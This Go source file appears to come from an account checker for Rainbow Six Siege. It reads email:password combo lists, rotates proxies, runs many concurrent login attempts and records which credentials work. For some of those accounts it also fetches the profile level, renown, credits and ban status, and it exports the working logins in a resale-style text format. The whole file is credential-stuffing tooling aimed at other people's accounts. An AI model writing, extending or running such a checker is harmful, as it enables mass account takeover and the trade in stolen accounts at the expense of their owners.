package checker

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"math"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/iloever-pix/r6checker/auth"
	"github.com/iloever-pix/r6checker/models"
)

type Checker struct {
	AuthClient          *auth.Client
	ValidAccounts       []*models.AccountData
	Stats               models.CheckerStats
	DataDir             string
	ProgressUpdates     chan models.ProgressUpdate
	resultsFile         string
	mu                  sync.Mutex
	stopping            bool
	ctx                 context.Context
	cancel              context.CancelFunc
	fetchSiegeSkinsData bool
	detailedInfoLimit   int

	accountsFile string
	proxiesFile  string
	useProxies   bool
	concurrency  int

	onStart    func(int)
	onProgress func(int, int, int, float64, time.Duration)
	onResult   func(*models.AccountData)
	onComplete func()
}

func NewChecker(dataDir string) *Checker {
	return &Checker{
		AuthClient:          auth.NewClient(),
		ValidAccounts:       make([]*models.AccountData, 0),
		DataDir:             dataDir,
		ProgressUpdates:     make(chan models.ProgressUpdate, 100),
		resultsFile:         filepath.Join(dataDir, "valid_accounts.json"),
		fetchSiegeSkinsData: true,
		detailedInfoLimit:   5,
		concurrency:         10,
	}
}

func (c *Checker) SetAccountsFile(path string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.accountsFile = path
}

func (c *Checker) SetProxiesFile(path string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.proxiesFile = path
}

func (c *Checker) EnableProxies(enabled bool) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.useProxies = enabled
}

func (c *Checker) SetConcurrency(n int) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if n < 1 {
		n = 1
	}
	if n > 200 {
		n = 200
	}
	c.concurrency = n
}

func (c *Checker) OnStart(fn func(int)) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.onStart = fn
}

func (c *Checker) OnProgress(fn func(int, int, int, float64, time.Duration)) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.onProgress = fn
}

func (c *Checker) OnResult(fn func(*models.AccountData)) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.onResult = fn
}

func (c *Checker) OnComplete(fn func()) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.onComplete = fn
}

func (c *Checker) Start() {
	c.mu.Lock()
	if c.accountsFile == "" {
		c.mu.Unlock()
		return
	}
	accountsFile := c.accountsFile
	proxiesFile := c.proxiesFile
	useProxies := c.useProxies
	concurrency := c.concurrency
	c.mu.Unlock()

	accounts, err := c.LoadAccounts(accountsFile)
	if err != nil {
		fmt.Printf("Error loading accounts: %v\n", err)
		return
	}
	if len(accounts) == 0 {
		fmt.Println("No accounts found.")
		return
	}

	var proxies []string
	if useProxies && proxiesFile != "" {
		proxies, err = c.LoadProxies(proxiesFile)
		if err != nil {
			fmt.Printf("Error loading proxies: %v\n", err)
			return
		}
	}

	if len(proxies) > 0 {
		c.AuthClient.SetProxies(proxies)
	} else {
		c.AuthClient.SetProxies(nil)
	}

	c.StartChecking(accounts, concurrency, true)
}

func (c *Checker) Stop() {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.cancel != nil {
		c.cancel()
	}
	c.stopping = true
}

func (c *Checker) LoadAccounts(filename string) ([]models.AccountCredentials, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open accounts file: %w", err)
	}
	defer file.Close()

	var accounts []models.AccountCredentials
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || !strings.Contains(line, ":") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		accounts = append(accounts, models.AccountCredentials{
			Email:    strings.TrimSpace(parts[0]),
			Password: strings.TrimSpace(parts[1]),
		})
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading accounts file: %w", err)
	}
	return accounts, nil
}

func (c *Checker) LoadProxies(filename string) ([]string, error) {
	if filename == "" {
		return nil, nil
	}
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open proxies file: %w", err)
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		proxies = append(proxies, line)
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading proxies file: %w", err)
	}
	return proxies, nil
}

func (c *Checker) StartChecking(accounts []models.AccountCredentials, concurrency int, clearPrevious bool) {
	c.mu.Lock()
	c.Stats = models.CheckerStats{
		StartTime: time.Now(),
	}
	c.stopping = false
	if clearPrevious {
		c.ValidAccounts = make([]*models.AccountData, 0)
	}
	ctx, cancel := context.WithCancel(context.Background())
	c.ctx = ctx
	c.cancel = cancel
	c.mu.Unlock()

	if c.onStart != nil {
		c.onStart(len(accounts))
	}

	os.MkdirAll(filepath.Dir(c.resultsFile), 0755)
	if clearPrevious {
		os.WriteFile(c.resultsFile, []byte("[]"), 0644)
	}

	total := len(accounts)
	jobs := make(chan models.AccountCredentials, total)
	results := make(chan models.CheckResult, total)

	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case account, ok := <-jobs:
					if !ok {
						return
					}
					result := c.checkAccount(ctx, account, workerID)
					select {
					case results <- result:
					case <-ctx.Done():
						return
					}
				}
			}
		}(i)
	}

	collectorDone := make(chan struct{})
	go func() {
		defer close(collectorDone)
		for i := 0; i < total; i++ {
			select {
			case <-ctx.Done():
				return
			case result := <-results:
				c.mu.Lock()
				if result.Valid && result.Account != nil {
					c.ValidAccounts = append(c.ValidAccounts, result.Account)
					c.Stats.Valid++
					accountToSave := result.Account
					c.mu.Unlock()
					c.saveAccount(accountToSave)
					if c.onResult != nil {
						c.onResult(accountToSave)
					}
				} else {
					c.Stats.Invalid++
					c.mu.Unlock()
				}
				c.mu.Lock()
				c.Stats.Processed++
				processed := c.Stats.Processed
				valid := c.Stats.Valid
				invalid := c.Stats.Invalid
				c.mu.Unlock()

				elapsed := time.Since(c.Stats.StartTime).Seconds()
				speed := float64(processed) / elapsed
				var eta float64
				if speed > 0 {
					eta = float64(total-processed) / speed
				}
				if c.onProgress != nil {
					c.onProgress(processed, valid, invalid, speed, time.Duration(eta)*time.Second)
				}
			}
		}
		c.mu.Lock()
		c.Stats.EndTime = time.Now()
		c.Stats.ElapsedTime = c.Stats.EndTime.Sub(c.Stats.StartTime).Seconds()
		if c.Stats.ElapsedTime > 0 {
			c.Stats.Speed = float64(c.Stats.Processed) / c.Stats.ElapsedTime
		}
		c.mu.Unlock()

		if c.onComplete != nil {
			c.onComplete()
		}
	}()

	for _, account := range accounts {
		select {
		case jobs <- account:
		case <-ctx.Done():
			break
		}
	}
	close(jobs)

	wg.Wait()
	close(results)
	<-collectorDone
}

func (c *Checker) StopChecking() {
	c.Stop()
}

func (c *Checker) GetValidAccounts() []*models.AccountData {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.ValidAccounts
}

func (c *Checker) GetStats() models.CheckerStats {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.Stats
}

func (c *Checker) checkAccount(ctx context.Context, creds models.AccountCredentials, workerID int) models.CheckResult {
	select {
	case <-ctx.Done():
		return models.CheckResult{Valid: false, Error: "stopped"}
	default:
	}
	accountData, err := c.AuthClient.Login(creds.Email, creds.Password)
	if err != nil {
		return models.CheckResult{
			Valid: false,
			Error: err.Error(),
		}
	}

	accountData.CreatedAt = time.Now()
	accountData.Valid = true

	c.mu.Lock()
	validCount := c.Stats.Valid
	shouldFetchSiegeSkinsData := c.fetchSiegeSkinsData && validCount < c.detailedInfoLimit
	c.mu.Unlock()

	if shouldFetchSiegeSkinsData && accountData.Ticket != "" && accountData.SessionID != "" {
		if siegeSkinsData, err := c.AuthClient.GetSiegeSkinsData(accountData.Ticket, accountData.SessionID); err == nil {
			accountData.SiegeSkinsData = siegeSkinsData
			fmt.Printf("Worker %d - Got SiegeSkins data for %s: Level %d, Renown: %d\n",
				workerID, creds.Email, siegeSkinsData.Level, siegeSkinsData.Renown)
		} else {
			fmt.Printf("Worker %d - Error fetching SiegeSkins data for %s: %s\n",
				workerID, creds.Email, err.Error())
		}
	}

	return models.CheckResult{
		Account: accountData,
		Valid:   true,
	}
}

func (c *Checker) saveAccount(account *models.AccountData) error {
	var accounts []*models.AccountData
	data, err := os.ReadFile(c.resultsFile)
	if err == nil {
		if err := json.Unmarshal(data, &accounts); err != nil {
			accounts = make([]*models.AccountData, 0)
		}
	} else {
		accounts = make([]*models.AccountData, 0)
	}
	accounts = append(accounts, account)
	data, err = json.MarshalIndent(accounts, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal accounts: %w", err)
	}
	if err := os.WriteFile(c.resultsFile, data, 0644); err != nil {
		return fmt.Errorf("failed to write accounts file: %w", err)
	}
	return nil
}

func (c *Checker) ExportAccounts(filename string, format string) error {
	c.mu.Lock()
	accounts := c.ValidAccounts
	c.mu.Unlock()

	if len(accounts) == 0 {
		return fmt.Errorf("no valid accounts to export")
	}

	var data []byte
	var err error

	switch format {
	case "json":
		data, err = json.MarshalIndent(accounts, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal accounts: %w", err)
		}
	case "txt":
		var lines []string
		for _, account := range accounts {
			line := fmt.Sprintf("%s:%s | Username: %s | ID: %s",
				account.Email, account.Password, account.Username, account.ProfileID)
			if account.SiegeSkinsData != nil {
				line += fmt.Sprintf(" | Level: %d | Renown: %d | Credits: %d",
					account.SiegeSkinsData.Level, account.SiegeSkinsData.Renown, account.SiegeSkinsData.Credits)
				if account.SiegeSkinsData.Banned {
					line += " | BANNED"
				}
			}
			lines = append(lines, line)
		}
		data = []byte(strings.Join(lines, "\n"))
	default:
		return fmt.Errorf("unsupported export format: %s", format)
	}

	return os.WriteFile(filename, data, 0644)
}

func FormatTime(seconds float64) string {
	mins := int(math.Floor(seconds / 60))
	secs := int(math.Floor(seconds)) % 60
	return fmt.Sprintf("%dm %ds", mins, secs)
}